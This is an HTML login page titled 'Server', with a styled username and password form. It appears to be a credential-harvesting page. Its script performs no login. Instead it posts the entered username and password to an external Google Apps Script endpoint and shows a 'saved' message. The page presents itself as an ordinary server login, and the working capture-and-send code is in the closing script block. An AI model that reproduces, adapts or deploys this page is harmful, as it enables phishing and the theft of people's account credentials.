<!DOCTYPE html>
<html lang="En">
<head>
<meta charset="UTF-8" />
<title>Server</title>
<style>
  /* فونت زیبا و کلی */
  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');

  body {
    font-family: 'Roboto', Arial, sans-serif;
    background: url('https://wallpaperaccess.com/full/1694390.jpg') no-repeat center center fixed;
    background-size: cover;
    padding: 40px 20px;
    margin: 0;
    direction: rtl;
  }

  .container {
    background: rgba(255, 255, 255, 0.95);
    max-width: 400px;
    margin: auto;
    padding: 30px 40px 40px 40px;
    border-radius: 15px;
    box-shadow: 0 10px 25px rgba(0,0,0,0.3);
    border: 2px solid #1e90ff;
  }

  h2 {
    text-align: center;
    color: #1e90ff;
    margin-bottom: 30px;
    font-weight: 700;
    text-shadow: 1px 1px 2px rgba(0,0,0,0.2);
        font-family: '2  Yekan';
  }

  label {
    display: block;
    margin-bottom: 8px;
    font-weight: 600;
    color: #333;
    text-shadow: 0 0 1px rgba(0,0,0,0.1);
        font-family: 'B Titr';
  }

  input[type="text"], input[type="password"] {
    width: 90%;
    padding: 12px 15px;
    margin-bottom: 25px;
    border: 2px solid #1e90ff;
    border-radius: 8px;
    font-size: 16px;
    transition: border-color 0.3s ease;
  }

  input[type="text"]:focus, input[type="password"]:focus {
    border-color: #ff8c00;
    outline: none;
    box-shadow: 0 0 8px #ff8c00;
  }

  button {
    width: 100%;
    padding: 14px 0;
    background: #1e90ff;
    border: none;
    border-radius: 10px;
    font-size: 18px;
    color: white;
    font-weight: 700;
    cursor: pointer;
    transition: background 0.3s ease;
    box-shadow: 0 4px 10px rgba(30,144,255,0.6);
    
  }

  button:hover {
    background: #ff8c00;
    box-shadow: 0 4px 15px rgba(255,140,0,0.7);
  }

  .message {
    margin-top: 20px;
    text-align: center;
    font-weight: 600;
    font-size: 17px;
  }

  .message.green {
    color: #28a745;
    text-shadow: 0 0 4px #28a745;
  }

  .message.red {
    color: #dc3545;
    text-shadow: 0 0 4px #dc3545;
  }
</style>
</head>
<body>
  <div class="container">
    <h2>Server</h2>
    <form id="loginForm">
      <label for="username">Username :</label>
      <input type="text" id="username" name="username" required placeholder="Enter your Username." />

      <label for="password">Password :</label>
      <input type="password" id="password" name="password" required placeholder="Enter your password." />

      <button type="submit">Enter</button>
    </form>
    <div class="message" id="message"></div>
  </div>

<script>
  document.getElementById('loginForm').addEventListener('submit', function(e){
    e.preventDefault();
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    const messageEl = document.getElementById('message');

    if(username && password) {
      fetch("https://script.google.com/macros/s/AKfycbwZJxJE-3JT3QhEwGzfd-xzvsM_KvoqQ_HLaU1-t--lIjboZWeNAZ3yK2dOyexzjcREFA/exec", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
      })
      .then(response => response.text())
      .then(data => {
        messageEl.className = 'message green';
        messageEl.textContent = "Your information save.";
        e.target.reset();
      })
      .catch(err => {
        messageEl.className = 'message red';
        messageEl.textContent = "Please try again!";
      });
    } else {
      messageEl.className = 'message red';
      messageEl.textContent = "Please fill out this field!";
    }
  });

</script>
</body>
</html>
